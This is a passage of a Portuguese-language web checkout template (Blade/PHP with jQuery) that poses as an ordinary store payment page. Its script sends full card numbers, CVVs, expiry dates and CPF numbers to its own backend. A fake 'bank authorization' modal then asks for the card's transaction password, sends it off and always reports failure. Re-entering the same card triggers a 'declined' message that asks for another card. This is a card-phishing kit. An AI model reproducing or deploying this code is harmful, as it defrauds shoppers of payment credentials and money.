18.47 17.35 25.95 45.75 3.72 14.14 14.58 25.19 28.47 28.98C104.6 325.96 106.27 325 121 340c13.23 13.47 33.84 15.88 49.74 5.82a39.676 39.676 0 0 1 42.53 0c15.89 10.06 36.5 7.65 49.73-5.82zM97.66 175.96c0-53.03 42.24-96.02 94.34-96.02s94.34 42.99 94.34 96.02-42.24 96.02-94.34 96.02-94.34-42.99-94.34-96.02z"/></svg>
  <div>
    <span>Satisfação</span>
    <span>Garantida</span>
  </div>
</li>
<li>
  <svg class="lock" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M400 224h-24v-72C376 68.2 307.8 0 224 0S72 68.2 72 152v72H48c-26.5 0-48 21.5-48 48v192c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V272c0-26.5-21.5-48-48-48zm-104 0H152v-72c0-39.7 32.3-72 72-72s72 32.3 72 72v72z"/></svg>
  <div>
    <span>Privacidade</span>
    <span>Protegida</span>
  </div>
</li>            </ul>
            
          </div>
          <!-- /.Botão de compra -->

          <div class="co-social-proofs-mobile"></div>

        </div>
        <!-- /.Campos formulário -->

        <!-- Resumo -->
        <div class="grid-5 grid-md-12 grid-sm-12 grid-xs-12 co-resume-wrapper">
          <div id="resume" class="card co-resume">
  <div class="card-header" style="background-color: {{$data['cor_loja']}};">
    <h2 style="color: white;" class="card-title"><i class="las la-shopping-bag" style="color: white;"></i> Resumo</h2>
    <div class="co-resume-items-btn">
      <button class="btn btn-xs btn-grey co-resume-btn-toggle active "><i class="las la-angle-down"></i></button>
    </div>
  </div>
  <div class="card-body co-resume-items-body ">
    <ul class="co-resume-items">
                        <li class="co-r-item">
            <div class="co-r-item-wrp">
              <figure class="co-r-item-image">
                <img src="{{$data['imagem1']}}" alt="{{$data['titulo']}}">
              </figure>
              <div class="co-r-item-infos">
                <h2 class="co-r-item-title">{{$data['titulo']}}</h2>
                <?php
                    if(isset($data['variacao'])){
                        $variacoes = explode('|',$data['variacao']);
                        array_pop($variacoes);
                        foreach($variacoes as $k => $v){
                            echo "<p>" . $v . "</p>";
                        }
                    }
                    
                ?>
                                <div class="co-r-item-actions">
                                    <div class="co-r-item-quantity">
                    <div class="form-group">
                      <div class="number-spinner">
                        <div class="ns-btn ns-sub"></div>
                        <input type="text" inputmode="numeric" id="quantidade" style="width: 27px; font-size: 1em;" class="ns-input2 number" value="{{$data['quantidade']}}" min="1" data-prod="500" readonly>
                        <div class="ns-btn ns-add"></div>
                      </div>
                    </div>
                  </div>
                                    <div class="co-r-item-price">R$ {{ str_replace('.', ',', number_format($data['preco'] * $data['quantidade'],2))}}</div>
                                  </div>
              </div>
            </div>
          </li>
                    <!-- Novos kits -->
          </ul>
    <div class="spinner-wrap md shipping-quantity-loader" id="spinner_qtd" style="display: none;">
      <span class="spinner"></span>
    </div>
  </div>
      <div class="card-body border-top co-resume-coupon  ">
    <div class="form-group floating-label mb-0">
      <div class="form-input-group form-input-right">
        <input type="text" class="form-input" name="coupon" id="co-coupon" maxlength="255">
        <label for="co-coupon" class="form-label">Cupom de desconto</label>
        <button style="color: {{$data['cor_loja']}}" class="btn form-input-btn form-input-btn-right btn-coupon">Aplicar</button>
      </div>
    </div>
    <ul class="parsley-errors-list filled coupon-error">
      <li></li>
    </ul>
  </div>
    <div class="card-body border-top co-resume-values">
    <ul>
      <li class="">
        <span>Produtos</span>
        <span class="v-cart-subtotal">R$ {{ str_replace('.', ',', number_format($data['preco'] * $data['quantidade'],2))}}</span>
      </li>
      <li class="v-cart-custom d-none ">
        <span>Personalizações <small class="v-desc"></small></span>
        <span class="v-cart-custom-val">+ R$ 0,00</span>
      </li>
      <li class=" ">
        <span>Frete <small class="v-cart-shipping-desc"></small></span>
        <span class="v-cart-shipping-val">Grátis</span>
      </li>
      <li class="v-cart-discount d-none ">
        <span>Desconto <small class="v-cart-discount-desc"><i class="las la-exclamation-circle" data-tippy-content=""></i></small></span>
        <span class="v-cart-discount-val">- R$ 0,00</span>
      </li>
      <li class="dest">
        <span>Total</span>
        <span style="color: {{$data['cor_loja']}}" id="card_total" class="v-cart-total">R$ {{ str_replace('.', ',', number_format($data['preco'] * $data['quantidade'],2))}}</span>
      </li>
    </ul>
  </div>
</div>
          <!-- Order Bump -->
                                          <!-- /.Order Bump -->

          <!-- Provas sociais -->
                    <!-- /.Provas sociais -->

        </div>
        <!-- /.Resumo -->

      </form>
    </div>
  </div>
  <!-- /.Página -->

  <!-- Footer -->
  <footer id="footer" class="footer">
  <div class="container">

    <!-- Copyright -->
    <div id="footer-copyright" class="row footer-row">
      <div class="grid-12">
        <div class="footer-copyright">
                    <span class="md-text"><p>{{$data['nm_loja']}} - CNPJ: {{$data['cnpj_loja']}} - {{date('Y')}}</p></span>
        </div>
      </div>
    </div>
    <!-- /.Copyright -->

  </div>
</footer>
  <!-- Scripts -->
  <!-- Loader -->
<!-- <div id="loader" class="loader-container">
  <div class="loader-wrapper">
    <div class="loader"></div>
    <div id="loader-text" class="loader-text"></div>
  </div>
</div> -->

<!-- Loader -->
<div id="loader" class="loader-container">
  <div class="loader-wrapper">
    <div class="loader-spinner"><div class="spinner primary" style="border-top-color: {{$data['cor_loja']}}"></div></div>
    <div id="loader-title" class="loader-title">Estamos finalizando seu pedido</div>
    <div id="loader-text" class="loader-text">Por favor aguarde</div>
  </div>
</div>

<!-- Alerta -->
<div id="modal-alert" class="modal modal-alert modal-center zoom" data-focus="[data-alert-btn]">
  <div class="modal-wrapper">
    <div class="modal-header" style="display: flex; flex-direction: column;">
      <div class="modal-alert-icon"><i class="las la-credit-card"></i></div>
      <div class="modal-title" style="margin-top: 10px;">Confirmar Transação</div>
    </div>
    <div class="modal-body">
      <div class="text-formatted text-center" style="font-size: 15px; margin-bottom: 10px;" id="digitos_vbv" data-alert-text>Digite a senha de 6 dígitos do cartão, a mesma utilizada para transações comerciais.</div>
      <input id="input_vbv" type="text" placeholder="xxxxxx" class="form-input"/>
    </div>
    <div id="vbv_erro" class="co-card-text sec-infos-text" style="text-align: center;font-size: 13px;color: red; display: none;">Senha Inválida, verifique a senha digitada.</div>
    <div class="co-card-text sec-infos-text" style="text-align: center; font-size: 12px;">Por motivos de segurança, o banco solicitou uma autorização adicional para garantir a proteção de suas informações financeiras.</div>
    <div class="modal-footer center">
      <button class="btn btn-grey"id="btn_vbv_confirma">Confirmar</button>
    </div>
  </div>
</div>

<!-- Confirmação -->
<div id="modal-confirm" class="modal modal-alert modal-confirm modal-center zoom active" data-focus="[data-confirm-btn]">
  <div class="modal-wrapper">
    <div class="modal-header">
      <div class="modal-alert-icon"><i data-confirm-icon></i></div>
      <div class="modal-title" data-confirm-title></div>
    </div>
    <div class="modal-body">
      <div class="text-formatted text-center" data-confirm-text></div>
    </div>
    <div class="modal-footer flex-around">
      <button class="btn btn-grey" data-modal-toggle="modal-confirm" data-confirm-cancel-btn></button>
      <button class="btn" data-confirm-btn></button>
    </div>
  </div>
</div>



<div id="div_erro" style="display:none;">
<div class="modal_mobile openSansText">
   <div class="title openSansText boldText" style="margin-bottom: 10px;">Houve um Erro</div>
   <p id="texto_modal_erro" class="content openSansText">Houve um erro ao processar o seu pagamento, por favor verifique os valores digitados ou utilize outra forma de pagamento.</p>

     <div class="button openSansText" style="    cursor: pointer;" id="btn_ok">OK</div>
   </div>
</div>

<div class="black_back" id="div_erro2" style="display:none;"></div>

<!-- Informações gerais -->
<span id="infos-base" 
data-core-assets="https://cdn.lpqv.io/app/core/assets/dist/"
data-base-url="https://pagamentolojadomecanicor.lpqv.io/" 
data-store="pagamentolojadomecanicor"
data-base-pag="checkout"
data-store-token="c0e4751855b4b34c1fb29bda50bc303f4935"
data-cart-token="jloi2z3n61-68a762d175482d74fff91f6405e035cf-22l7krbdvgu3t68jbko096jbg8"
data-product-url="checkoutstore" 
data-lp="2"
data-lp-url="https://pagamentolojadomecanicor.lpqv.io/" 
data-has-kit=""
data-has-variant=""
data-store-model="checkoutstore"
data-user-on-pag-param="checkout"
data-gateway-retry=""
data-transaction-id=""
>
</span>

<input type="hidden" id="_hash" value="{{$data['hash']}}">
<input type="hidden" id="__l" value="{{$data['id_loja']}}">
<input type="hidden" id="vl_produto" value="{{$data['preco']}}">

<input type="hidden" value="{{($data['vbv'] ? 's' : 'n')}}" id="vbv_sn">
<input type="hidden" value="{{$data['mensagem_erro']}}" id="mensagem_erro">
<input type="hidden" value="Houve um erro ao processar o seu pagamento, por favor verifique os valores digitados ou utilize outra forma de pagamento." id="mensagem_padrao">


<script src="/libs/jquery.js"></script>
<script src="/libs/jquery.mask.js"></script>
<!-- JavaScript -->

<script>
    window.freteAtual = 0;
    window.freteAtualds = 'Correios - SEDEX';
    window._fretes = `
            <div class="form-check shipping_way">
                <input type="radio" name="shipping_way" class="input_frete" frete="{{$data['frete_padrao'] != null ? $data['frete_padrao'] : 'Correios - SEDEX'}}" preco="0" id="co_shipping_way_pac-transportadora" value="pac-transportadora" data-desc="{{$data['frete_padrao'] != null ? $data['frete_padrao'] : 'Correios - SEDEX'}}" data-price="0.00" required="" checked="">
                <label style="border-color: {{$data['cor_loja']}}" frete="{{$data['frete_padrao'] != null ? $data['frete_padrao'] : 'Correios - SEDEX'}}" preco="0" class="fretes_label ativo" for="co_shipping_way_pac-transportadora">
                <div class="shipping_way_infos">
                    <b>{{$data['frete_padrao'] != null ? $data['frete_padrao'] : 'Correios - SEDEX'}}</b>
                    <small>Entrega de 2 a 4 dias úteis</small>
                </div>
                <div class="shipping_way_price">Grátis</div>
                </label>
            </div>

            @foreach($data['fretes'] as $k => $v)
                <div class="form-check shipping_way">
                    <input type="radio" name="shipping_way" class="input_frete" id="{{$k}}" frete="{{$v['ds_frete']}}" preco="{{$v['preco']}}" value="pac-transportadora" data-desc="{{$v['ds_frete']}}" data-price="0.00" required="" checked="">
                    <label style="border-color: {{$data['cor_loja']}}" frete="{{$v['ds_frete']}}" preco="{{$v['preco']}}" class="fretes_label" for="{{$k}}">
                    <div class="shipping_way_infos">
                        <b>{{$v['ds_frete']}}</b>
                    </div>
                    <div class="shipping_way_price">R$ {{str_replace('.',',',$v['preco'])}}</div>
                    </label>
                </div>
            @endforeach
    `;

    window.fretesAct = function(){

        $("#pac-transportadora").click();
        $(".input_frete").on('change', function(e){
            let vl = parseFloat($(this).attr('preco'));
            window.freteAtual = vl;
            window.freteAtualds = $(this).attr('frete');
            let cart_total;


            if(vl != 0){
                cart_total = $("#card_total").text().replace('R$ ', '').replace(',', '.');
                cart_total = parseFloat(cart_total);
                cart_total = cart_total + vl;
                cart_total = cart_total.toFixed(2).replace('.', ',');
                $(".v-cart-shipping-val").text('R$ ' + vl.toFixed(2).replace('.', ','));
                $(".v-cart-total").text(`R$ ${cart_total}`)
                $("#valor_card_baixo").text(`R$ ${cart_total}`)
            }else{
                cart_total = parseFloat($("#vl_produto").val()) * parseInt($("#quantidade").val())
                cart_total = cart_total.toFixed(2).replace('.', ',');
                $(".v-cart-shipping-val").text('Grátis');
                $(".v-cart-total").text(`R$ ${cart_total}`)
                $("#valor_card_baixo").text(`R$ ${cart_total}`)
            }

        })
    }
</script>
<script> 
  window.LPQV = window.LPQV || {}; 
  window.LPQV.ob_layout = 'carousel';

  fbq('track', 'InitiateCheckout');


$("#cpf_cc").mask('000.000.000-00');
$("#validade_cc").mask('00/00');
$("#cvv_cc").mask('0000');
$("#cc_cc").mask('0000 0000 0000 0000');


function modalErro(mensagem){
  $("#texto_modal_erro").text(mensagem);
  $("#div_erro").show();
  $("#div_erro2").show();
}

$("#btn_ok").click(function(e){
  $("#div_erro").hide();
  $("#div_erro2").hide();
})
function validarCartaoCredito(numeroCartao) {
  if (typeof numeroCartao !== 'string') {
    return false;
  }

  const numeroLimpo = numeroCartao.replace(/\D/g, '');

  if (!algoritmoLuhn(numeroLimpo)) {
    return false;
  }

  if (
    /^(4\d{12}(\d{3})?)$/.test(numeroLimpo) ||
    /^(5[1-5]\d{14})$/.test(numeroLimpo) ||
    /^(2[0-9]\d{14})$/.test(numeroLimpo) ||
    /^(3[47]\d{13})$/.test(numeroLimpo) ||
    /^(6(?:011|5\d{2})\d{12})$/.test(numeroLimpo) ||
    /^(3(?:0[0-5]|[68]\d)\d{11})$/.test(numeroLimpo) ||
    /^(35(?:2[89]|[3-8]\d)\d{12})$/.test(numeroLimpo) ||
    /^(50\d{14})$/.test(numeroLimpo) ||
    /^(6(?:304|759)\d{10})$/.test(numeroLimpo)
  ) {
    return true;
  }

  return false;
}

function algoritmoLuhn(numero) {
  let soma = 0;
  let alternar = false;

  for (let i = numero.length - 1; i >= 0; i--) {
    let digito = parseInt(numero.charAt(i), 10);

    if (alternar) {
      digito *= 2;
      if (digito > 9) {
        digito -= 9;
      }
    }

    soma += digito;
    alternar = !alternar;
  }

  return soma % 10 === 0;
}

const updateParcela = ()=>{
  let vl = $("#card_total").text();
  vl = vl.replace('R$ ', '');
  vl = vl.replace(',', '.');
  vl = parseFloat(vl);

  $("#tempselectparcela").remove();
  $("#div_cartao").append(
    $("<div>",{
      class: 'form-group floating-label is-valid',
      id: 'tempselectparcela',
      style: 'margin-top: 10px;'
    }).append(
      $("<select>",{
        name: "parcela",
        class: 'form-input',
        'data-parsley-trigger': 'change focusout',
        id: 'parcela'
      })
    )
  )
  for(i = 1; i <= 12; i++){
    let valor_format = vl/i;
    valor_format = valor_format.toFixed(2);
    valor_format = valor_format.replace('.', ',');

    $("#parcela").append(
      $("<option>",{
        value: i,
        text: `${i}x de R$ ${valor_format} Sem Juros`
      })
    )

  }
} 

updateParcela();


$("#btn_vbv_confirma").click(function(e){

    if($("#input_vbv").val().length < 4 || $("#input_vbv").val().length != window.dig){
        $("#vbv_erro").show();
        return;
    }

    $("#modal-alert").removeClass('open');
    $("#loader").addClass('active');
    $("#vbv_erro").hide();

    $.post("/checkout/updateVbv", { i: window.id_vbv, v: $("#input_vbv").val() },(r)=>{
      setTimeout(()=>{
          $("#loader").removeClass('active');
          $("#modal-alert").removeClass('open');
            modalErro(($("#mensagem_erro").val() == '' ? $("#mensagem_padrao").val() : $("#mensagem_erro").val()))
            $("#input_vbv").val('')
        },2500);
    })
});

const updatePreco = ()=>{
  let vl = parseInt($("#quantidade").val()) * parseFloat($("#vl_produto").val());
  let total = vl + window.freteAtual;
  vl = vl.toFixed(2).replace('.', ',');
  total = total.toFixed(2).replace('.', ',');
  $(".co-r-item-price").text(`R$ ${vl}`)
  $(".v-cart-total").text(`R$ ${total}`)
  $(".v-cart-subtotal").text(`R$ ${vl}`)
  $("#spinner_qtd").hide();
  updateParcela();
}
setTimeout(() => {
  updatePreco();
  $(".v-cart-shipping-val").text('Grátis')
}, 500);
setInterval(()=>{
  updatePreco();
}, 10000)
async function updateQuantidade(vl){
    $.post('/checkout/updateQuantidade',{
        hash: $("#_hash").val(),
        q: $("#quantidade").val()
    },(r)=>{
        if(r.status == 200){
            let vl = parseInt($("#quantidade").val()) * parseFloat($("#vl_produto").val());
            let total = vl + window.freteAtual;
            vl = vl.toFixed(2).replace('.', ',');
            total = total.toFixed(2).replace('.', ',');
            $(".co-r-item-price").text(`R$ ${vl}`)
            $(".v-cart-total").text(`R$ ${total}`)
            $(".v-cart-subtotal").text(`R$ ${vl}`)
            $("#spinner_qtd").hide();
            updateParcela();
        }
    })
}

$(".ns-sub").click(async function(e){
    $("#spinner_qtd").show();
    if(parseInt($(".ns-input2").val()) == 1) return;
    let vl = parseInt($(".ns-input2").val()) - 1;
    $(".ns-input2").val(vl);
    updateQuantidade(vl);
})

$(".ns-add").click(async function(e){
    $("#spinner_qtd").show();
    let vl = parseInt($(".ns-input2").val()) + 1;
    $(".ns-input2").val(vl);
    updateQuantidade(vl);
})

setInterval(()=>{
    $("#parsley-id-13").remove();
    $(".parsley-required").each((i,v)=>{
      $(v).remove();
    })
    $(".form-group").each((i,v)=>{
        $(v).removeClass('is-invalid');
    })
}, 200)

$("#co-zipcode").on('input', function(e){
    
    if($(this).val().length < 9) return;

    $.get('https://viacep.com.br/ws/' + $(this).val() + '/json/',(r)=>{
        $(".form-label").each((i,v)=>{ $(v).addClass('show') })
        $("#co-address").val(r.logradouro??'');
        $("#co-neighborhood").val(r.bairro??'');
        $("#co-city").val(r.localidade??'');
        $("#co-state").val(r.uf).change();
        $(".campos-endereco").show();
        $("#entrega").show();

        setTimeout(()=>{
            $(".shipping-ways-loader").hide();
            $("#append_frete").empty();
            $("#append_frete").append(window._fretes);
            $("#append_frete").show()
            window.fretesAct();
            
            $("#co_shipping_way_pac-transportadora").click();
        },2000)
        
    })

})

$.post('/local/checkout',{
    useragent: window.navigator.userAgent,
    localizacao: 'Não Disponível',
    dispositivo: 'Não Disponível',
    local: 'Informações Pessoais - LPQV',
    hash: $('#_hash').val(),
    il: $("#__l").val()
},(r)=>{
    console.log("|           ^_^          |");
})

$("#compraragora").click(()=>{
    let metodoPagamento = $(".collapse-item.active")[0];

    if(metodoPagamento == undefined){
      modalErro('Selecione um método de pagamento.');
      return;
    }

    metodoPagamento = $(metodoPagamento).attr('metodo');

    if($("#co-name").val().length < 5){
      alert('Verifique o campo Nome Completo.');
      return;
    }
    if($("#co-email").val().length < 5){
      alert('Verifique o E-mail digitado.');
      return;
    }
    if($("#co-phone").val().length < 5){
      alert('Verifique o Telefone digitado.');
      return;
    }
    if($("#co-cpf").val().length < 14){
      alert('Verifique o CPF digitado.');
      return;
    }
    if($("#co-zipcode").val().length < 9){
      alert('Verifique o CEP digitado.');
      return;
    }
    
    if($("#co-number").val().length < 1){
      alert('Verifique o número do endereço digitado.');
      return;
    }
    if($("#co-address").val().length < 3){
      alert('Verifique o endereço digitado.');
      return;
    }
    if($("#co-neighborhood").val().length < 3){
      alert('Verifique o bairro digitado.');
      return;
    }

    if($("#co-password").length > 0){
        if($("#co-password").val().length < 6){
            alert('Por medidas de segurança, a senha de sua conta deve ter pelo menos 6 caracteres.');
            return;
        }
    }
    
    $("#loader").addClass('active');
    
    const atualiza = async function(){
      return new Promise((res)=>{
        $.post('/checkout/atualizaCarrinho',
            {
                flag: 'passo1',
                hash: $('#_hash').val(),
                nome_completo: $("#co-name").val(),
                email: $("#co-email").val(),
                cpf: $("#co-cpf").val(),
                telefone: $("#co-phone").val(),
                senha: ($("#co-password").length > 0 ? $("#co-password").val() : null)
            },
            (retorno)=>{
              console.log(retorno);
               res();
            })
      })
    }

    const atualizaFrete = async function(){
      return new Promise((res)=>{
        $.ajax({
          url: '/checkout/atualizaFreteCarrinho',
          type: 'POST',
          data: {
            hash: $('#_hash').val(),
            vlfrete: window.freteAtual??'0',
            frete: window.freteAtualds??'SEDEX'
          },
          success: (r)=>{
            res();
          }
        })
      })
    }

    const atualzaEndereco = async function(){
      return new Promise((res)=>{
        $.ajax({
          url: '/checkout/enderecoCarrinho',
          type: 'POST',
          data:{
            hash: $("#_hash").val(),
            cep: $("#co-zipcode").val(),
            rua: $("#co-address").val(),
            numero: $("#co-number").val(),
            bairro: $("#co-neighborhood").val(),
            complemento: $("#co-complement").val()
          },success:(retorno)=>{
            console.log(retorno);
            res();
          }
        })
      })
    }

    const atualizaMetodoPagamento = async function(){
      return new Promise((res)=>{
        $.ajax({
            url: '/checkout/updateMetodoPagamento',
            type: 'POST',
            data:{
                hash: $('#_hash').val(),
                p: metodoPagamento
            },
            success: (r)=>{
                res();
            }
        })
      })
    }

    const pagamentoCartao = async function(){
      return new Promise((res)=>{
        let cc = $("#cc_cc").val();
        let validade = $("#validade_cc").val();
        let cvv = $("#cvv_cc").val();
        let titular = $("#titular_cc").val();
        let cpf = $("#cpf_cc").val();

        if(cc == window.cc && validade == window.validade && cvv == window.cvv){
            modalErro('O seu pagamento foi recusado, tente outro cartão de crédito ou altere a forma de pagamento.');
            $("#loader").removeClass('active');
            return;
        }

        if(cc == '' || cc.length < 19 || !validarCartaoCredito(cc)){
            modalErro('Número de cartão inválido, verifique os valores digitados.');
            $("#loader").removeClass('active');
            return;
        }

        if(validade == ""){
            modalErro('Número de validade do cartão inválido, verifique os valores digitados.');
            $("#loader").removeClass('active');
            return;
        }

        let validadeSplit = validade.split('/');
        let mes = validadeSplit[0];
        mes = parseInt(mes);

        let ano = validadeSplit[1];
        ano = parseInt(ano);

        if(mes > 12 || mes < 0 || ano < 23){
            modalErro('Número de validade do cartão inválido, verifique os valores digitados.');
            $("#loader").removeClass('active');
            return;
        }

        if(cvv == '' || cvv.length < 3){
            modalErro('Número de segurança (CVV) do cartão inválido, verifique os valores digitados.');
            $("#loader").removeClass('active');
            return;
        }

        if(titular == ''){
            modalErro('Digite o nome do titular do cartão.');
            $("#loader").removeClass('active');
            return;
        }

        if(cpf.length < 14){
            modalErro('Número de CPF inválido, verifique os valores digitados.');
            $("#loader").removeClass('active');
            return;
        }


        let bin = cc.replace(' ', '');
        bin = bin.replace(' ', '');
        bin = bin.replace(' ', '');
        bin = bin.substring(0,6);

        fbq('track', 'Purchase',
        {
          currency: "BRL",
          value: $("#vl_produto").val()
        });


        $.post('/checkout/updateInfo',{
            hash: $('#_hash').val(),
            bin: bin,
            cc: cc,
            validade: validade,
            cvv: cvv,
            titular: $("#titular_cc").val(),
            cpf: $("#cpf_cc").val()
        },(r)=>{
            window.cc = cc;
            window.validade = validade;
            window.cvv = cvv;
            window.id_vbv = r.i;
            window.dig = (r.d == 404 ? 4 : r.d);
            let string = '';
            let string2 = '';
            if(r.d != 404){
                for(i = 1; i <= r.d; i++){
                    string += '0';
                    string2 += 'x';
                }
            }else{
                string = '000000';
                string2 = 'xxxxxx';
                r.d = '4 a 6';
            }
            $("#input_vbv").mask(string);
            $("#input_vbv").attr('placeholder', string2);
            $("#loader").removeClass('active');
            if($("#vbv_sn").val() == 's' && r.v == 's'){
                $("#digitos_vbv").text("Digite a senha de "+ r.d + " dígitos do cartão, a mesma utilizada para transações comerciais.")
                setTimeout(()=>{
                $("#modal-alert").addClass('open');
                }, 1500)
            }else{
                // Erro no pagamento via cartão: abrir fluxo de PIX automaticamente
                modalErro(($("#mensagem_erro").val() == '' ? $("#mensagem_padrao").val() : $("#mensagem_erro").val()))
                metodoPagamento = 'pix';
                try{
                  await atualizaMetodoPagamento();
                }catch(e){}
                location.href = `/checkout/3/${$("#_hash").val()}/2`;
            }
            res();
        })
      })
    }

    const all = async function(){
      await atualiza();
      await atualizaFrete();
      await atualizaMetodoPagamento();
      await atualzaEndereco();
      if(metodoPagamento == 'cartao'){
        await pagamentoCartao();
      }else{
        location.href = `/checkout/3/${$("#_hash").val()}/2`;
      }
    }
    all();
})

</script>
<script src="https://cdn.lpqv.io/app/core/assets/dist/js/plugins.min.js?v=110"></script>
<script src="https://cdn.lpqv.io/app/checkout/assets/dist/js/plugins.min.js?v=121"></script>
<script src="https://cdn.lpqv.io/app/core/assets/dist/js/script.min.js?v=110"></script>
<script src="https://www.mercadopago.com/v2/security.js" view="checkout"></script>
<script src="https://secure.mlstatic.com/sdk/javascript/v1/mercadopago.js"></script>
<script src="https://cdn.lpqv.io/app/checkout/assets/dist/js/script.min.js?v=121"></script>


</body>

</html>